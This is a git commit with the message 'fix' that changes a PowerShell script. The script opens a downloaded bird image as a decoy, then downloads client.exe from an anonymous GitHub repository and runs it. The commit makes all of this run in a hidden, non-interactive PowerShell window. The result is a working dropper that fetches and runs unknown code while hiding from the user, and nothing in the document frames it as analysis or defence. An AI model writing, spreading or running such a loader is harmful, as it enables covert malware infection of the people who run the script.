2c0f4d79e7e456ae8d01f444b5bb049a61880c29
Your Name <you@example.com>
2025-02-16 09:46:25 -0800

    'fix'

--- script-ps.ps1
+++ script-ps.ps1
@@ -1,13 +1,19 @@
-# Download the image
-Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
+# Create a new PowerShell process that runs hidden
+$scriptBlock = {
+    # Download the image
+    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
 
-# Open the downloaded image
-Start-Process "$env:TEMP\blue-bird.jpg"
+    # Open the downloaded image
+    Start-Process "$env:TEMP\blue-bird.jpg"
 
-# Download the client.exe file
-$exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
-$exePath = "$env:TEMP\client.exe"
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+    # Download the client.exe file
+    $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
+    $exePath = "$env:TEMP\client.exe"
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# Run the downloaded client.exe
-Start-Process $exePath
+    # Run the downloaded client.exe
+    Start-Process $exePath
+}
+
+# Run the script block in a hidden window
+Start-Process powershell.exe -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -Command & {$scriptBlock}"
